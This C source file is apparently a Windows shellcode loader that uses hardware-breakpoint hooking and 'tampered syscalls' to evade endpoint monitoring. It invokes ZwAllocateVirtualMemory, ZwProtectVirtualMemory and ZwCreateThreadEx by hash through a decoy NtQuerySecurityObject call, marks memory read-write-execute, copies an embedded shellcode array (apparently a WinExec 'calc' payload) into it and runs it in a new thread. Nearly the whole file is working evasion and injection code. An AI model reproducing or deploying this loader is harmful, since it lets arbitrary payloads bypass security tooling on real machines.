#include <Windows.h>
#include <stdio.h>

#include"Structs.h"
#include"FuncPtrs.h"

#define TAMPER_SYSCALL(u32SyscallHash, uParm1, uParm2, uParm3, uParm4, uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB)				\
	if (1){                                                                                                                                         \
		                                                                                                                                        \
		NTSTATUS		STATUS			= 0x00;                                                                                 \
		fnNtQueryDirectoryFile	pNtQuerySecurityObject	= NULL;                                                                                 \
																			\
		if (!(pNtQuerySecurityObject = (fnNtQueryDirectoryFile)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQuerySecurityObject")))    \
			return -1;                                                                                                                      \
																			\
		if (!InitializeTamperedSyscall(pNtQuerySecurityObject, u32SyscallHash, uParm1, uParm2, uParm3, uParm4))                                 \
			return -1;                                                                                                                      \
																			\
		if ((STATUS = pNtQuerySecurityObject(NULL, NULL, NULL, NULL, uParm5, uParm6, uParm7, uParm8, uParm9, uParmA, uParmB)) != 0x00) {        \
			printf("[!] 0x%0.8X Failed With Error: 0x%0.8X \n", u32SyscallHash, STATUS);                                                    \
			return -1;                                                                                                                      \
		}                                                                                                                                       \
	}
// ==========================================================================================================================

#define ZwAllocateVirtualMemory_DJB2    0x221C143B                                                                     
#define ZwProtectVirtualMemory_DJB2     0x5B63D1D7                                                                     
#define ZwCreateThreadEx_DJB2			0x476030FF 

// ==========================================================================================================================

unsigned char rawData[] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

// ==========================================================================================================================

int main() {

	// Init Hardware breakpoint Hooking
	InitHardwareBreakpointHooking();

	PVOID		BaseAddress = NULL;
	SIZE_T		RegionSize = 0x100;
	DWORD		dwOldProtection = 0x00;
	HANDLE		hThread = NULL;

	TAMPER_SYSCALL(ZwAllocateVirtualMemory_DJB2, (HANDLE)-1, &BaseAddress, 0x00, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("[>] BaseAddress : 0x%p \n", BaseAddress);
	printf("[>] RegionSize : %d \n", (int)RegionSize);
	printf("\n\n");
#endif

	TAMPER_SYSCALL(ZwProtectVirtualMemory_DJB2, (HANDLE)-1, &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("[>] Memory is now RWX \n");
	printf("\n\n");
#endif

	PBYTE D = (PBYTE)BaseAddress;
	PBYTE S = (PBYTE)rawData;

	for (int i = 0; i < sizeof(rawData); i++)
		*D++ = *S++;

	TAMPER_SYSCALL(ZwCreateThreadEx_DJB2, &hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

#ifdef DEBUG
	printf("[>] Payload Executed With Thread Of ID: %d \n", GetThreadId(hThread));
#endif

	Sleep(1000 * 10);

	if (!HaltHardwareBreakpointHooking())
		return -1;

	return 0;
}
